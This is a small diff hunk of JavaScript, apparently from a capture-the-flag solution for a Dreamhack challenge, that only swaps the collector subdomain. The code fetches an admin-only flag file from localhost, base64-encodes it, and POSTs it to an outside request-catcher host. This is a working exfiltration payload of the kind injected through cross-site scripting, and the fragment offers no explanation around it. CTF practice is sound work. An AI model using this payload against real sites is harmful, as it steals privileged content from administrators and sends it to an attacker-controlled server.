@@ -6,7 +6,7 @@ fetch("http://localhost:1337/app/admin/flag.pdf")
   .then(r => r.text())
   .then(flag => {
     const b64 = btoa(flag);
-    fetch("https://eshzove.request.dreamhack.games/", {
+    fetch("https://sijovsz.request.dreamhack.games/", {
       method: "POST",
       body: b64,
       headers: { "Content-Type": "text/plain" }
